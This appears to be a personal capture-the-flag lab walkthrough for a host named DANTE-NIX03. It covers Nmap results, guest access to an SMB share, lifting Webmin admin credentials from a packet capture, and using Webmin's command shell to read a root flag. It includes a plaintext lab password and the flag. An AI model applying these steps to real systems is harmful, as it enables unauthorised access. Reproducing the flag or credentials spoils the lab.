Nmap:
```
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.41
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 37M   2020-06-25 13:00  webmin-1.900.zip
| -     2020-07-13 02:21  webmin/
|_
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
10000/tcp open  http        MiniServ 1.900 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 9A2006C267DE04E262669D821B57EAD1
|_http-title: Login to Webmin
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
33060/tcp open  mysqlx      MySQL X protocol listener
Service Info: Host: 127.0.0.1

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-26T22:42:49
|_  start_date: N/A
| nbstat: NetBIOS name: DANTE-NIX03, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   DANTE-NIX03<00>      Flags: <unique><active>
|   DANTE-NIX03<03>      Flags: <unique><active>
|   DANTE-NIX03<20>      Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>

```

---
# SMB

```bash
smbclient -L \\\\172.16.1.17\\ -U "Guest"                                        
# Guest

# Sharename       Type      Comment
# ---------       ----      -------
# forensics       Disk

smbclient \\\\172.16.1.17\\forensics -U "Guest"

get monitor

file monitor 
# monitor: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 65535)
```

Open monitor in wireshark. We find credentials to login:
![[Pasted image 20251130211023.png]]
`admin:Password6543`

Others -> Command Shell -> Root shell
![[Pasted image 20251130214733.png]]

```bash
cat /root/flag.txt
DANTE{SH4RKS_4R3_3V3RYWHERE}
```